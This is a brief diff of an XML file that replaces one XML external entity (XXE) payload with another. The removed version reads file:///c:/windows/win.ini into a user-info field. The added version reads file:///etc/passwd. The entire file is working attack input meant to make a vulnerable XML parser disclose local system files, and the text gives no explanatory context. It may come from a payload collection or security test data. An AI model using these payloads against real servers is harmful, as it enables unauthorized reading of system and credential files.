@@ -1,6 +1,4 @@
-<!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///c:/windows/win.ini"> ]>
-<userInfo>
- <firstName>John</firstName>
- <lastName>&ent;</lastName>
-</userInfo>
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
